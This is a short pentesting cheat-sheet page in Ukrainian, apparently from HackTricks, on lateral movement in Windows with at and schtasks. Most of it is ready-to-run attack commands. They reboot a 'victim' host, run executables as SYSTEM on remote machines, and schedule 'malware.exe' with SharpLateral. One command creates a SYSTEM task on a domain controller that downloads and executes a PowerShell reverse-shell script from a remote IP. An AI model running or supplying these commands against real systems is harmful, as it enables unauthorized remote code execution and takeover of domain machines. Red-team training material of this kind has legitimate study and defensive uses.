# AtExec / SchtasksExec

{{#include ../../banners/hacktricks-training.md}}

## Як це працює

At дозволяє планувати завдання на хостах, де ви знаєте ім'я користувача/(пароль/хеш). Отже, ви можете використовувати це для виконання команд на інших хостах і отримання виходу.
```
At \\victim 11:00:00PM shutdown -r
```
Використовуючи schtasks, спочатку потрібно створити задачу, а потім викликати її:
```bash
schtasks /create /n <TASK_NAME> /tr C:\path\executable.exe /sc once /st 00:00 /S <VICTIM> /RU System
schtasks /run /tn <TASK_NAME> /S <VICTIM>
```

```bash
schtasks /create /S dcorp-dc.domain.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "MyNewtask" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/InvokePowerShellTcp.ps1''')'"
schtasks /run /tn "MyNewtask" /S dcorp-dc.domain.local
```
Ви також можете використовувати [SharpLateral](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
```
Більше інформації про [**використання schtasks з срібними квитками тут**](../active-directory-methodology/silver-ticket.md#host).

{{#include ../../banners/hacktricks-training.md}}
